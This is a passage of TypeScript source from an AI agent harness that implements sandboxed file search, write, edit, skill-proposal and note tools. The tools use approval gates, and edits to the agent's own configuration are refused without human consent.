        `that URL if it is the one you want, and it will be checked in its own right.`,
      summary: `webfetch ${url.hostname} — ${res.status} redirect`,
    };
  }

  const body = await res.text().catch(() => "");
  const type = res.headers.get("content-type") ?? "";
  const text = /html/i.test(type) ? htmlToText(body) : body;

  return {
    code: res.ok ? TOOL_OK : TOOL_OK_EMPTY,
    content: clamp(
      `${res.status} ${res.statusText} · ${type || "unknown type"}\n\n${text}`,
      ctx.maxOutputBytes
    ),
    summary: `webfetch ${url.hostname} — ${res.status}, ${text.length} chars`,
  };
}

// ---------------------------------------------------------------------------
// Search: glob and grep
// ---------------------------------------------------------------------------

/**
 * Directories never walked by `glob` or `grep`.
 *
 * Fixed, not configurable, and deliberately so: a search that returned a
 * different set of files depending on a machine's ignore rules would make the
 * same question answerable differently on two checkouts. These are the trees
 * that are build output or dependency caches in every ecosystem this harness
 * targets, and none of them is source anyone is asking about.
 */
const dnsLookup = promisify(dnsLookupCb) as (
  host: string,
  opts: { all: true; verbatim: boolean }
) => Promise<{ address: string }[]>;

const NEVER_WALKED = new Set([
  ".git",
  "node_modules",
  "target",
  "dist",
  "build",
  ".venv",
  "venv",
  "__pycache__",
  ".mypy_cache",
  ".pytest_cache",
  ".next",
  ".turbo",
  "vendor",
  ".gnomon-audit",
  ".gnomon-sessions",
]);

/** Hard ceilings, so a search on a large tree cannot hang or flood the window. */
const WALK_MAX_FILES = 20_000;
const SEARCH_MAX_HITS = 200;

/**
 * Walk the tree under `dir`, returning repo-relative POSIX paths, sorted.
 *
 * Sorted because the model's next move is decided by what comes back: an
 * order that depended on the filesystem would make an identical repository
 * answer the same question differently on two machines.
 */
function walkFiles(root: string, dir: string): string[] {
  const out: string[] = [];
  const stack: string[] = [dir];
  while (stack.length > 0 && out.length < WALK_MAX_FILES) {
    const cur = stack.pop()!;
    let entries: Dirent[];
    try {
      entries = readdirSync(cur, { withFileTypes: true });
    } catch {
      continue; // unreadable directory is not a reason to fail the search
    }
    for (const e of entries) {
      if (e.isSymbolicLink()) continue; // a link out of the tree escapes the sandbox
      const abs = join(cur, e.name);
      if (e.isDirectory()) {
        if (NEVER_WALKED.has(e.name)) continue;
        stack.push(abs);
      } else if (e.isFile()) {
        out.push(relative(root, abs).split(sep).join("/"));
        if (out.length >= WALK_MAX_FILES) break;
      }
    }
  }
  return out.sort();
}

/** Resolve the optional `path` argument to a directory inside the sandbox. */
function searchScope(
  args: Record<string, unknown>,
  ctx: ToolContext
): { abs: string; rel: string } | ToolOutcome {
  const raw = String(args.path ?? "").trim() || ".";
  const abs = resolveInRoot(ctx.root, raw, ctx.sandbox);
  if (!abs) {
    return {
      code: TOOL_OUT_OF_SANDBOX,
      content: `Refused: "${raw}" is outside the repository root and sandbox=${ctx.sandbox}.`,
      summary: `search ${raw} — refused (outside sandbox)`,
    };
  }
  if (!existsSync(abs)) {
    return {
      code: TOOL_OK_EMPTY,
      content: `No such directory: ${raw}`,
      summary: `search ${raw} — not found`,
    };
  }
  // Derive rel from the RESOLVED path, not from what the caller typed.
  //
  // It used to be the raw argument, while the file list it is sliced against
  // comes back from walkFiles already normalised relative to the root. So the
  // slice length was wrong for every spelling except "dir" and "dir/": `./src`
  // and an absolute path both returned ZERO results, silently and with code 0.
  // A model that reaches for `./src` -- an ordinary way to write it -- is told
  // the directory is empty.
  const rel = relative(ctx.root, abs).split(sep).join("/") || ".";
  return { abs, rel };
}

/**
 * `glob` — list files whose path matches a glob.
 *
 * Read-only, so it is not in MUTATING and never asks for approval. That is
 * the point of having it: before this existed, a role with no `bash` (the
 * verifier, the coordinator) could not find a file it had not been told the
 * name of, and a role with `bash` had to spend an approval on `find` to do
 * what is plainly a read.
 */
async function globTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const pattern = String(args.pattern ?? "").trim();
  if (!pattern) {
    return {
      code: TOOL_FAILED,
      content: "glob needs a `pattern`, e.g. `**/*.ts` or `src/**/test_*.py`.",
      summary: "glob — no pattern",
    };
  }
  const scope = searchScope(args, ctx);
  if ("code" in scope) return scope;

  let re: RegExp;
  try {
    re = globToRegExp(pattern);
  } catch {
    return {
      code: TOOL_FAILED,
      content: `"${pattern}" is not a valid glob.`,
      summary: "glob — bad pattern",
    };
  }

  const gd = await gateReadOnly("glob", `glob ${pattern} in ${scope.rel}`, ctx);
  if (gd) return gd;

  const base = scope.rel === "." ? "" : scope.rel.replace(/\/+$/, "") + "/";
  const hits = walkFiles(ctx.root, scope.abs).filter((f) =>
    re.test(base ? f.slice(base.length) : f)
  );

  if (hits.length === 0) {
    return {
      code: TOOL_OK_EMPTY,
      content: `No files match ${pattern} under ${scope.rel}.`,
      summary: `glob ${pattern} — 0 files`,
    };
  }
  const shown = hits.slice(0, SEARCH_MAX_HITS);
  const truncated =
    hits.length > shown.length
      ? `\n\n(${hits.length - shown.length} more not shown — narrow the pattern)`
      : "";
  return {
    code: TOOL_OK,
    content: clamp(shown.join("\n") + truncated, ctx.maxOutputBytes),
    summary: `glob ${pattern} — ${hits.length} file(s)`,
  };
}

/**
 * `grep` — find lines matching a regular expression.
 *
 * Returns `path:line:text`, which is what makes the follow-up `read` cheap:
 * without it a model looking for a symbol guesses filenames, and every guess
 * is a round trip. Read-only, so no approval.
 */
async function grepTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const pattern = String(args.pattern ?? "").trim();
  if (!pattern) {
    return {
      code: TOOL_FAILED,
      content: "grep needs a `pattern` — a regular expression.",
      summary: "grep — no pattern",
    };
  }
  const scope = searchScope(args, ctx);
  if ("code" in scope) return scope;

  let re: RegExp;
  try {
    re = new RegExp(pattern, args.ignore_case === true ? "i" : "");
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content:
        `"${pattern}" is not a valid regular expression: ` +
        `${err instanceof Error ? err.message : String(err)}`,
      summary: "grep — bad pattern",
    };
  }

  const includeRaw = String(args.include ?? "").trim();
  let include: RegExp | null = null;
  if (includeRaw) {
    try {
      include = globToRegExp(includeRaw);
    } catch {
      return {
        code: TOOL_FAILED,
        content: `"${includeRaw}" is not a valid glob for \`include\`.`,
        summary: "grep — bad include",
      };
    }
  }

  const gd = await gateReadOnly("grep", `grep /${pattern}/ in ${scope.rel}`, ctx);
  if (gd) return gd;

  const base = scope.rel === "." ? "" : scope.rel.replace(/\/+$/, "") + "/";
  const files = walkFiles(ctx.root, scope.abs).filter(
    (f) => !include || include.test(base ? f.slice(base.length) : f)
  );

  const lines: string[] = [];
  let matched = 0;
  let filesWithHits = 0;
  for (const f of files) {
    let text: string;
    try {
      const buf = readFileSync(join(ctx.root, f));
      // A NUL in the first 8k is the standard binary heuristic. Without it a
      // grep over a repo with fixtures returns pages of mojibake.
      if (buf.subarray(0, 8192).includes(0)) continue;
      text = buf.toString("utf-8");
    } catch {
      continue;
    }
    let hitHere = false;
    const split = text.split("\n");
    for (let i = 0; i < split.length; i++) {
      if (!re.test(split[i])) continue;
      re.lastIndex = 0;
      matched++;
      hitHere = true;
      if (lines.length < SEARCH_MAX_HITS) {
        lines.push(`${f}:${i + 1}:${split[i].trim().slice(0, 300)}`);
      }
    }
    if (hitHere) filesWithHits++;
  }

  if (matched === 0) {
    return {
      code: TOOL_OK_EMPTY,
      content: `No match for /${pattern}/ under ${scope.rel}${
        includeRaw ? ` (include ${includeRaw})` : ""
      }.`,
      summary: `grep ${pattern} — 0 matches`,
    };
  }
  const truncated =
    matched > lines.length
      ? `\n\n(${matched - lines.length} more match(es) not shown — narrow the pattern or set \`include\`)`
      : "";
  return {
    code: TOOL_OK,
    content: clamp(lines.join("\n") + truncated, ctx.maxOutputBytes),
    summary: `grep ${pattern} — ${matched} match(es) in ${filesWithHits} file(s)`,
  };
}

async function writeTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const path = String(args.path ?? "");
  // `String(undefined ?? "")` is "", so a call that simply omitted `content`
  // TRUNCATED the file and reported success: an existing file went to zero
  // bytes with summary "write src/a.txt (+0 −2)" and code 0. Small models omit
  // arguments routinely, so this was one malformed tool call away from silent
  // data loss, reported as a result rather than a refusal.
  //
  // An empty string is still a legitimate write; an ABSENT one is not.
  if (typeof args.content !== "string") {
    return {
      // TOOL_DENIED (a refusal), not TOOL_FAILED (11, apparatus_failure).
      // CONTRACTS.md draws that line explicitly: 11 means "understood the
      // request and could not carry it out", and "a model's malformed argument
      // arriving there would make it meaningless" — apparatus_failure is the
      // signal to go and look at the harness. A missing argument is the model
      // getting it wrong, so the harness says no.
      code: TOOL_DENIED,
      content:
        `Refused: write needs a \`content\` string. Omitting it would empty ` +
        `${path || "the file"}, which is not what a missing argument should mean. ` +
        `Send content: "" if you meant to empty it.`,
      summary: `write — no content given`,
    };
  }
  const content = args.content;
  const abs = resolveInRoot(ctx.root, path, ctx.sandbox);
  if (!abs) {
    return {
      code: TOOL_OUT_OF_SANDBOX,
      content: `Refused: "${path}" is outside the repository root and sandbox=${ctx.sandbox}.`,
      summary: `write ${path} — refused (outside sandbox)`,
    };
  }

  if (inSurface(ctx, abs)) {
    const consent = ctx.allow ?? "strict";
    if (consent === "strict") {
      return {
        code: TOOL_DENIED,
        content:
          `Refused: "${path}" is inside .gnomon/, the surface that decides how ` +
          `this agent behaves. It is not writable by a tool call — editing it ` +
          `is a human act, because it changes the surface hash and the rules ` +
          `the next turn runs under. The human can allow it for this session ` +
          `with /allow custom (each edit approved) or /allow all; to propose ` +
          `durable guidance instead, use the skill tool.`,
        summary: `write ${path} — refused (surface is read-only)`,
      };
    }
    // The human consented to surface edits this session (/allow custom|all).
    // This is the one path that writes inside .gnomon/, so it is deliberate and
    // loud: it always announces that the hash moved.
    if (existsSync(abs) && statSync(abs).isDirectory()) {
      return {
        code: TOOL_FAILED,
        content: `${path} is a directory, not a file. Give a path to a file.`,
        summary: `write ${path} — is a directory`,
      };
    }
    const surfaceBefore = existsSync(abs) ? readFileSync(abs, "utf-8") : "";
    const surfaceDiff = diffLines(surfaceBefore, content);
    const { added: sa, removed: sr } = diffStat(surfaceDiff);
    // custom always asks; all defers to the configured gate.
    if (consent === "custom" || needsApproval("write", ctx.gate)) {
      const ok = await ctx.approve({
        tool: "write",
        summary: `write ${path} — SURFACE EDIT, moves the hash (+${sa} −${sr})`,
        preview: surfaceDiff,
      });
      if (!ok) {
        return {
          code: TOOL_DENIED,
          content: `Refused: the user declined the surface write to ${path}.`,
          summary: `write ${path} — surface edit denied`,
        };
      }
    }
    try {
      mkdirSync(dirname(abs), { recursive: true });
      writeFileSync(abs, content, "utf-8");
      return {
        code: TOOL_OK,
        content:
          `Wrote ${path} (+${sa} −${sr}). This changed the surface — the hash ` +
          `moved, and the next turn runs under the new rules.`,
        summary: `write ${path} — SURFACE CHANGED (+${sa} −${sr})`,
      };
    } catch (err) {
      return {
        code: TOOL_FAILED,
        content: `Could not write ${path}: ${err instanceof Error ? err.message : String(err)}`,
        summary: `write ${path} — failed`,
      };
    }
  }

  const scope = writeAllowed(ctx, abs);
  if (!scope.ok) {
    return {
      code: TOOL_DENIED,
      content:
        `Refused: "${scope.rel}" is not a path this role may write.\n` +
        `This role may write ${scope.listed}.`,
      summary: `write ${path} — not permitted for this role`,
    };
  }

  if (existsSync(abs) && statSync(abs).isDirectory()) {
    return {
      code: TOOL_FAILED,
      content: `${path} is a directory, not a file. Give a path to a file.`,
      summary: `write ${path} — is a directory`,
    };
  }

  const before = existsSync(abs) ? readFileSync(abs, "utf-8") : "";
  const diff = diffLines(before, content);
  const { added, removed } = diffStat(diff);

  if (needsApproval("write", ctx.gate)) {
    const ok = await ctx.approve({
      tool: "write",
      summary: `write ${path} (+${added} −${removed})${before ? "" : " [new file]"}`,
      preview: diff,
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined the write to ${path}.`,
        summary: `write ${path} — denied`,
      };
    }
  }

  try {
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, content, "utf-8");
    return {
      code: TOOL_OK,
      content: `Wrote ${path} (+${added} −${removed}).`,
      summary: `write ${path} (+${added} −${removed})`,
    };
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not write ${path}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `write ${path} — failed`,
    };
  }
}

async function editTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const path = String(args.path ?? "");
  const oldText = String(args.old_text ?? "");
  const newText = String(args.new_text ?? "");
  const abs = resolveInRoot(ctx.root, path, ctx.sandbox);
  if (!abs) {
    return {
      code: TOOL_OUT_OF_SANDBOX,
      content: `Refused: "${path}" is outside the repository root and sandbox=${ctx.sandbox}.`,
      summary: `edit ${path} — refused (outside sandbox)`,
    };
  }

  if (inSurface(ctx, abs)) {
    return {
      code: TOOL_DENIED,
      content:
        `Refused: "${path}" is inside .gnomon/, the surface that decides how ` +
        `this agent behaves. It is not editable by a tool call — changing it ` +
        `is a human act, because it changes the surface hash and the rules ` +
        `the next turn runs under. Once the human allows it (/allow custom|all) ` +
        `a surface file is changed by a full-file write, not an in-place edit.`,
      summary: `edit ${path} — refused (surface is read-only)`,
    };
  }
  const scope = writeAllowed(ctx, abs);
  if (!scope.ok) {
    return {
      code: TOOL_DENIED,
      content:
        `Refused: "${scope.rel}" is not a path this role may modify.\n` +
        `This role may write ${scope.listed}.`,
      summary: `edit ${path} — not permitted for this role`,
    };
  }
  if (!existsSync(abs)) {
    return {
      code: TOOL_FAILED,
      content: `No such file: ${path}`,
      summary: `edit ${path} — not found`,
    };
  }
  if (statSync(abs).isDirectory()) {
    return {
      code: TOOL_FAILED,
      content: `${path} is a directory, not a file.`,
      summary: `edit ${path} — is a directory`,
    };
  }

  const before = readFileSync(abs, "utf-8");
  const hits = before.split(oldText).length - 1;
  if (hits === 0) {
    return {
      code: TOOL_FAILED,
      content: `old_text not found in ${path}. It must match exactly, including indentation.`,
      summary: `edit ${path} — no match`,
    };
  }
  if (hits > 1) {
    return {
      code: TOOL_FAILED,
      content: `old_text appears ${hits} times in ${path}. It must match exactly once — add surrounding context.`,
      summary: `edit ${path} — ${hits} matches`,
    };
  }

  const after = before.replace(oldText, newText);
  const diff = diffLines(before, after);
  const { added, removed } = diffStat(diff);

  if (needsApproval("edit", ctx.gate)) {
    const ok = await ctx.approve({
      tool: "edit",
      summary: `edit ${path} (+${added} −${removed})`,
      preview: diff,
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined the edit to ${path}.`,
        summary: `edit ${path} — denied`,
      };
    }
  }

  try {
    writeFileSync(abs, after, "utf-8");
    return {
      code: TOOL_OK,
      content: `Edited ${path} (+${added} −${removed}).`,
      summary: `edit ${path} (+${added} −${removed})`,
    };
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not write ${path}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `edit ${path} — failed`,
    };
  }
}

/**
 * Propose a skill.
 *
 * Writes to `.gnomon/skills/proposed/` only, at a path derived from the name,
 * so a proposal can never target an existing skill or escape into the rest of
 * the surface. It does not take effect in this session: skills are loaded from
 * `.gnomon/skills/`, and moving it there is a human action. That is what keeps
 * "same surface + same prompt → same outcome" true while still letting the
 * harness learn.
 */
async function skillTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  if (!ctx.config) {
    return {
      code: TOOL_FAILED,
      content: "Skill authorship is unavailable: no surface is loaded.",
      summary: "skill — no surface",
    };
  }

  const name = String(args.name ?? "").trim();
  const body = String(args.body ?? "").trim();
  if (!name || !body) {
    return {
      code: TOOL_FAILED,
      content: "A skill needs both a name and a body.",
      summary: "skill — incomplete",
    };
  }

  const proposal: SkillProposal = {
    name,
    body,
    description:
      typeof args.description === "string" ? args.description.trim() : undefined,
    match: typeof args.match === "string" ? args.match.trim() || undefined : undefined,
    roles: Array.isArray(args.roles) ? args.roles.map(String) : undefined,
  };

  if (proposal.match) {
    try {
      new RegExp(proposal.match, "i");
    } catch {
      return {
        code: TOOL_FAILED,
        content: `"${proposal.match}" is not a valid regular expression.`,
        summary: "skill — bad pattern",
      };
    }
  }

  if (needsApproval("skill", ctx.gate)) {
    const ok = await ctx.approve({
      tool: "skill",
      summary: `propose skill "${name}"`,
      preview: renderSkill(proposal).split("\n").map((l) => `+ ${l}`),
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined the skill proposal "${name}".`,
        summary: `skill "${name}" — denied`,
      };
    }
  }

  const { id, existed } = proposeSkill(ctx.config, proposal);
  return {
    code: TOOL_OK,
    content:
      `Proposed skill "${name}" as ${id}.md. It is NOT active: proposals live ` +
      `in .gnomon/skills/proposed/ and take effect only once accepted with ` +
      `\`gnomon skill accept ${id}\`, which changes the surface hash ` +
      `deliberately.${existed ? " (replaced an earlier proposal of the same name)" : ""}`,
    summary: `skill ${id} proposed${existed ? " (replaced)" : ""}`,
  };
}

/**
 * Run one tool call.
 *
 * A tool the surface does not offer returns a refusal naming it, rather than
 * being ignored — the model is told why nothing happened.
 */
/**
 * A correct backgrounding form for an arbitrary command.
 *
 * The first version of this prefixed `setsid ` onto the command text, which is
 * only valid when the command happens to be a single program invocation. For
 * `cd /home && sleep 5 && echo done` it emitted
 *   setsid cd /home && sleep 5 && echo done </dev/null >LOG 2>&1 & echo $!
 * which setsid rejects ("failed to execute cd") while the shell cheerfully runs
 * the remaining && branches in the foreground. Advice that does not work is
 * worse than no advice: the model follows it, gets exit 0 and a confusing
 * stderr, and concludes the job is running.
 *
 * Wrapping in `sh -c` with the command single-quoted makes any command legal,
 * pipelines and && chains included.
 */
/** Let go of a finished child's pipes so an orphan cannot hold the loop open. */
function releasePipes(proc: { stdout?: unknown; stderr?: unknown; unref?: () => void }): void {
  (proc.stdout as { destroy?: () => void } | undefined)?.destroy?.();
  (proc.stderr as { destroy?: () => void } | undefined)?.destroy?.();
  proc.unref?.();
}

export const JOB_LOG_DIR = ".gnomon-jobs";

export function backgroundRecipe(command: string, log = `${JOB_LOG_DIR}/job.log`): string {
  const quoted = `'${command.trim().replace(/'/g, `'\\''`)}'`;
  // Project-relative, NOT /tmp. The advice used to name /tmp, and `read` refuses
  // /tmp under the default confined sandbox -- so following the harness's own
  // instructions produced a log the harness could not then read. Beside the
  // surface, like .gnomon-sessions/ and .gnomon-audit/.
  return `mkdir -p ${JOB_LOG_DIR} && setsid sh -c ${quoted} </dev/null >${log} 2>&1 & echo $!`;
}

/**
 * Record something this run learned, for later steps in the same run to read.
 *
 * Deliberately not a memory of everything: a note is a short, deliberate line
 * the model chose to keep, which is what makes the block worth re-reading. The
 * cap is on the store, not on the model's enthusiasm.
 */
export function noteTool(args: Record<string, unknown>, ctx: ToolContext): ToolOutcome {
  const text = typeof args.text === "string" ? args.text.trim() : "";
  if (!text) {
    return {
      code: TOOL_FAILED,
      content: "Refused: `note` needs a non-empty `text`.",
      summary: "note — empty",
    };
  }
  if (!ctx.notes) {
    return {
      code: TOOL_FAILED,
      content: "Refused: this build supplied no note store, so a note would be silently dropped.",
      summary: "note — unavailable",
    };
  }
  ctx.notes.add(text);
  const n = ctx.notes.list().length;
  return {
    code: 0,
    content: `Noted (${n} note${n === 1 ? "" : "s"} this run).`,
    summary: `note — ${text.slice(0, 60)}`,
  };
}

export async function executeTool(
  name: string,
  args: Record<string, unknown>,
  ctx: ToolContext,
  offered: Set<string>
): Promise<ToolOutcome> {
  if (!offered.has(name)) {
    return {
      code: TOOL_NOT_DECLARED,
      content:
        `Refused: "${name}" is not available to this role. ` +
        `Available: ${[...offered].join(", ") || "(none)"}.`,
      summary: `${name} — not available to this role`,
    };
  }

  // A throw here would take the whole session down: an unguarded
  // readFileSync on a directory (EISDIR) once killed a live run outright.
  // A broken tool is an apparatus_failure the model can be told about.
  try {
    return await dispatch(name, args, ctx);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    return {
      code: TOOL_FAILED,
      content: `Tool "${name}" failed: ${msg}`,
      summary: `${name} — ${msg}`,
    };
  }
}

async function dispatch(
  name: string,
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  // MCP tools are named `mcp__<server>__<tool>` and routed to their server.
  if (name.startsWith("mcp__")) {
    if (!ctx.mcp) {
      return {
        code: TOOL_NOT_DECLARED,
        content: `Refused: "${name}" is an MCP tool, but no MCP server is connected.`,
        summary: `${name} — no mcp`,
      };
    }
    // An MCP call reaches an arbitrary third-party server with model-chosen
    // args — the tool class most likely to have external side effects, and the
    // only one that used to run ungated. Gate it like a mutating built-in:
    // prompt under on_write and always, proceed silently only under `never`.
    if (ctx.gate !== "never") {
      const ok = await ctx.approve({
        tool: name,
        summary: `${name} — MCP call`,
        preview: [JSON.stringify(args).slice(0, 2000)],
      });
      if (!ok) {
        return {
          code: TOOL_DENIED,
          content: `Refused: the user declined the ${name} call.`,
          summary: `${name} — denied`,
        };
      }
    }
    const r = await ctx.mcp.call(name, args);
    return {
      code: r.isError ? TOOL_FAILED : TOOL_OK,
      content: r.content,
      summary: `${name} — ${r.isError ? "error" : "ok"}`,
    };
  }
  switch (name) {
    case "read":
      return readTool(args, ctx);
    case "bash":
      return bashTool(args, ctx);
    case "task":
      return taskTool(args, ctx);
    case "webfetch":
      return webfetchTool(args, ctx);
    case "todo":
      return todoTool(args, ctx);
    case "note":
      return noteTool(args, ctx);
    case "compute":
      return computeTool(args, ctx);
    case "glob":
      return globTool(args, ctx);
    case "grep":
      return grepTool(args, ctx);
    case "write":
      return writeTool(args, ctx);
    case "edit":
      return editTool(args, ctx);
    case "skill":
      return skillTool(args, ctx);
    default:
      return {
        code: TOOL_NOT_DECLARED,
        content: `Refused: "${name}" is declared but not implemented by this build.`,
        summary: `${name} — not implemented`,
      };
  }
}
